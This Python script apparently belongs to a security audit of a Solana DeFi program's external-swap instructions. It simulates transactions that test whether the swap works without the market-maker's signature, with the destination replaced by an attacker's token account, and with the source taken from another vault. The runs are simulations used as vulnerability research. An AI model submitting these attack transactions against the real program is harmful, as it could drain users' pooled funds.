#!/usr/bin/env python3
"""External-swap mechanics: setup+cleanup pair, signer requirements, destination substitution."""
import base64, json, sys
sys.path.insert(0, "/home/heisenberg/CA/armada/analysis")
from solrpc import *
from simtx import simulate, summarize

PROG = "ArmN3Av2boBg8pkkeCK9UuCN9zSUVc2UQg1qR2sKwm8d"
TOKEN = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
SYSIX = "Sysvar1nstructions1111111111111111111111111"
A = "/home/heisenberg/CA/armada/analysis"
s = json.load(open(f"{A}/ix-full-samples.json"))
r1 = json.load(open(f"{A}/recon1.json"))
st = s["external_swap_setup"][0]; cl = s["external_swap_cleanup"][0]
acc_s = st["accounts"]; acc_c = cl["accounts"]
data_s = b58decode(st["data"]); data_c = b58decode(cl["data"])
print("setup amount arg:", int.from_bytes(data_s[8:16], "little"))
VK = acc_s[1]; v = r1["vaults"][VK]
MM = acc_s[0]
print("vault:", VK[:12], "MM:", MM[:12], "src:", acc_s[2][:12], "dst:", acc_s[3][:12])
ATT = "BN1TEzniqHnv6huecisEtpaz2thUnmPCBwi9THcYriLU"  # unprivileged LP holder (not MM)

def tamt(pk):
    a = get_account(pk, encoding="jsonParsed")
    try:
        info = a["data"]["parsed"]["info"]; return int(info["tokenAmount"]["amount"])
    except Exception:
        return None

def run(label, payer, signer_map, source, dest, setup=True, cleanup=True, data_s_=None, data_c_=None):
    ixes = []
    if setup:
        ixes.append({"program_id": PROG, "accounts": [
            (MM, signer_map.get(0, False), False), (VK, False, True), (source, False, True), (dest, False, True),
            (TOKEN, False, False), (SYSIX, False, False)], "data": data_s_ or data_s})
    if cleanup:
        ixes.append({"program_id": PROG, "accounts": [
            (MM, signer_map.get(0, False), False), (VK, False, True), (source, False, False), (dest, False, False),
            (TOKEN, False, False)], "data": data_c_ or data_c})
    pre = {"src": tamt(source), "dst": tamt(dest)}
    res = simulate(ixes, payer, return_accounts=[source, dest])
    summ = summarize(res)
    post = {}
    for addr, a in zip([source, dest], (res.get("value") or {}).get("accounts") or []):
        if a: post[addr] = int.from_bytes(base64.b64decode(a["data"][0])[64:72], "little")
    print(f"\n===== {label} ===== err={summ['err']} CU={summ.get('unitsConsumed')}")
    for l in summ["logs_tail"][-8:]:
        print("   ", l)
    print("  src pre/post:", pre["src"], post.get(source), " dst pre/post:", pre["dst"], post.get(dest))
    return summ

# 1) setup+cleanup with MM as signer (the legitimate shape)
run("1. setup+cleanup, MM signs", MM, {0: True}, acc_s[2], acc_s[3])
# 2) setup+cleanup WITHOUT any MM signature (attacker pays)
run("2. setup+cleanup, NO MM signature (attacker payer)", ATT, {0: False}, acc_s[2], acc_s[3])
# 3) dest = attacker token account (attack attempt), MM signs
att_dst = None
for mint in (v["token_mint_a"], v["token_mint_b"]):
    r = rpc("getTokenAccountsByOwner", [ATT, {"mint": mint}, {"encoding": "jsonParsed"}])
    vals = (r or {}).get("value") or []
    if vals: att_dst = vals[0]["pubkey"]; break
print("\nattacker dst candidate:", att_dst)
if att_dst:
    run("3. setup+cleanup, dest = attacker ATA, MM signs", MM, {0: True}, acc_s[2], att_dst)
    run("3b. setup+cleanup, dest = attacker ATA, NO MM sig", ATT, {0: False}, acc_s[2], att_dst)
# 4) source = a funded vault account from another vault (6JwmYu USDC staging), MM signs
v2 = r1["vaults"]["6JwmYu4cveodYbXYtJ3zxTTuSR9mXZb6iENNMnXdUwBK"]
run("4. setup+cleanup, source = 6JwmYu USDC staging (other vault), MM signs", MM, {0: True}, v2["token_vault_a"], v2["token_vault_b"])
